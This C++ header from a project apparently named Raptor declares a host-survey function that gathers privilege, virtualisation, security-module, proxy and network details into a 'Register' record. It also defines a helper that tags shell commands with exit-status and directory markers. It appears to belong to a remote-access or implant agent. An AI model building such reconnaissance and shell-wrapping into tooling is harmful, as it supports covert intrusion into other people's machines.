#pragma once

#include <cstdint>
#include <format>
#include <sys/epoll.h>
#include "common/register.hpp"

namespace Raptor::Utils {

    inline std::string makeEndMarker(uint32_t id) {
        return std::format(" ; printf '\\0END:{}:%s:%s\\0\\n' \"$?\" \"$PWD\"\n", id);
    }

/**
 * @brief Collects system information and fills a Register structure.
 *
 * Reads from /proc, /sys, uname(2), sysinfo(2), statvfs(2), getifaddrs(3),
 * and environment variables.  All fields that cannot be determined are left
 * zero-initialised; no field is ever left unterminated.
 *
 * This function never throws — failures are silently skipped so the caller
 * always receives a best-effort snapshot.
 *
 * Fields populated:
 *  - Identity   : hostname, username, homeDir, shell, pid, processPath/Name
 *  - Privileges : isAdmin, isSudoer
 *  - OS         : os, osVersion, kernelVersion, arch
 *  - Hardware   : cpu, cpuCores, ramBytes, diskTotal/FreeBytes, uptimeSeconds
 *  - Network    : internalIp, internalIp2, macAddress, defaultGateway, dnsServer
 *  - Environment: domain, isDomainJoined, isDocker, isVM, vmType
 *  - Security   : selinuxEnabled, apparmorEnabled, isProxy, proxyUrl
 *  - Locale     : timezone, locale
 *
 * @return A fully populated Register value (returned by value; zero-cost
 *         with NRVO).
 */
[[nodiscard]] Raptor::Common::Register collect() noexcept;
/**
 * @brief Puts a file descriptor into non-blocking mode (O_NONBLOCK).
 *
 * Reads the current flags with F_GETFL then ORs in O_NONBLOCK via F_SETFL.
 *
 * @param fd  Open file descriptor to modify.
 * @throws std::runtime_error if either fcntl call fails, with the
 *         syscall name, fd value, and errno message embedded.
 */
void setNonBlocking(int fd);
} // namespace Raptor::Utils
